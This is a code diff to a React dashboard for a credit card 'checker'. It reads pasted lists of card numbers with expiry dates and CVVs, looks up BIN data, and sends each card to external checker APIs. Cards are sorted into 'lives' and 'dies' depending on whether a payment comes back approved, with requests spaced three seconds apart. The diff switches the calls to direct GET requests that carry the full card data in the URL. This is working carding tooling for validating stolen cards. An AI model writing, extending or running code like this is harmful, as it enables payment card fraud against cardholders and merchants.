@@ -81,6 +81,24 @@ const formatCard = (cc) => {
   };
 };
 
+// Função para processar o retorno do checker
+const processCheckerResponse = (response, binInfo) => {
+  const result = {
+    card: response.cc,
+    binInfo,
+    message: response.retorno || 'Unknown Response',
+    success: false
+  };
+
+  if (response.success && response.retorno.includes('Pagamento Aprovado')) {
+    result.success = true;
+  } else if (response.error) {
+    result.success = false;
+  }
+
+  return result;
+};
+
 export default function Painel() {
   const { t, lang } = useTranslation('dashboard');
   const [cards, setCards] = useState([]);
@@ -180,6 +198,8 @@ export default function Painel() {
     }
 
     setChecking(true);
+    setLives([]);
+    setDies([]);
     const listFormated = String(list).split('\n').filter(n => n);
 
     listFormated.forEach(async (cc, index) => {
@@ -188,23 +208,19 @@ export default function Painel() {
           const cardData = formatCard(cc);
           const binInfo = await getBinInfo(cardData.bin);
 
-          const check = await axios.post('/api/checks', {
-            cc,
-            gateway: 'adyen',
-            binInfo,
-            apiUrl: process.env.API_1_URL + cardData.number + '|' + 
-                   cardData.month + '|' + cardData.year + '|' + cardData.cvv
-          }, {
+          const checkUrl = `${process.env.API_1_URL}${cardData.number}|${cardData.month}|${cardData.year}|${cardData.cvv}`;
+          
+          const check = await axios.get(checkUrl, {
             headers: { token: window.localStorage.getItem('token') }
           });
 
-          const result = {
-            card: cc,
+          const result = processCheckerResponse({
+            cc,
             ...check.data,
             binInfo
-          };
+          }, binInfo);
 
-          if (check.data.success) {
+          if (result.success) {
             setLives(old => [result, ...old]);
           } else {
             setDies(old => [result, ...old]);
@@ -223,7 +239,8 @@ export default function Painel() {
           setDies(old => [{
             card: cc,
             success: false,
-            message: 'Check Error'
+            message: 'Check Error',
+            binInfo: await getBinInfo(cc.split('|')[0]?.slice(0,6))
           }, ...old]);
         }
       }, 3000 * index);
@@ -244,6 +261,8 @@ export default function Painel() {
     }
 
     setChecking(true);
+    setLives([]);
+    setDies([]);
     const listFormated = String(premiumList).split('\n').filter(n => n);
 
     listFormated.forEach(async (cc, index) => {
@@ -252,23 +271,19 @@ export default function Painel() {
           const cardData = formatCard(cc);
           const binInfo = await getBinInfo(cardData.bin);
 
-          const check = await axios.post('/api/premium-checks', {
-            cc,
-            gateway: 'premium',
-            binInfo,
-            apiUrl: process.env.API_2_URL + cardData.number + '|' + 
-                   cardData.month + '|' + cardData.year + '|' + cardData.cvv
-          }, {
+          const checkUrl = `${process.env.API_2_URL}${cardData.number}|${cardData.month}|${cardData.year}|${cardData.cvv}`;
+          
+          const check = await axios.get(checkUrl, {
             headers: { token: window.localStorage.getItem('token') }
           });
 
-          const result = {
-            card: cc,
+          const result = processCheckerResponse({
+            cc,
             ...check.data,
             binInfo
-          };
+          }, binInfo);
 
-          if (check.data.success) {
+          if (result.success) {
             setConsecutiveDies(0);
             setLives(old => [result, ...old]);
           } else {
@@ -299,7 +314,8 @@ export default function Painel() {
           setDies(old => [{
             card: cc,
             success: false,
-            message: 'Premium Check Error'
+            message: 'Premium Check Error',
+            binInfo: await getBinInfo(cc.split('|')[0]?.slice(0,6))
           }, ...old]);
         }
       }, 3000 * index);
